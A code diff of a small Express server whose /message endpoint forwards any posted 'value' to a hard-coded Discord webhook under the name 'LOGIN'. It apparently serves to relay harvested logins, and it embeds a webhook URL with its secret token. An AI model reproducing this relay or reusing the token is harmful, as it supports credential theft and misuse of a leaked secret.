@@ -38,20 +38,23 @@ app.all('/', (req, res) => {
 app.post('/hash', md5hash);
 
 app.post('/message', async (req, res) => {
-  
-  const { value } = req.body;
+  try {
+    const { value } = req.body;
+    const webhookUrl = "https://discord.com/api/webhooks/1148881222261547018/eLk0DyWLT9b0GpWUQIosRwPFEfg15LZr5py5BYICP5WpNyTgJRKZXpuFd5EOXCpdmD8H";
 
-  const webhookUrl = "https://discord.com/api/webhooks/1148881222261547018/eLk0DyWLT9b0GpWUQIosRwPFEfg15LZr5py5BYICP5WpNyTgJRKZXpuFd5EOXCpdmD8H";
+    const message = {
+      username: "LOGIN",
+      avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583446952935424/ug-mkt.png",
+      content: value
+    };
 
-  const message = {
-    username: "LOGIN",
-    avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583446952935424/ug-mkt.png",
-    content: "lmao"
-  };
-  await sendWebhookMessage(message, webhookUrl);
-  res.status(200);
-  console.log(message + webhookUrl);
-  
+    // Now, req.body should be properly parsed
+    await sendWebhookMessage(message, webhookUrl);
+    console.log(message + webhookUrl);
+  } catch (error) {
+    console.error('Error handling the request:', error);
+    res.status(500).send('Internal Server Error');
+  }
 });
 
 app.listen(process.env.PORT || 3000)
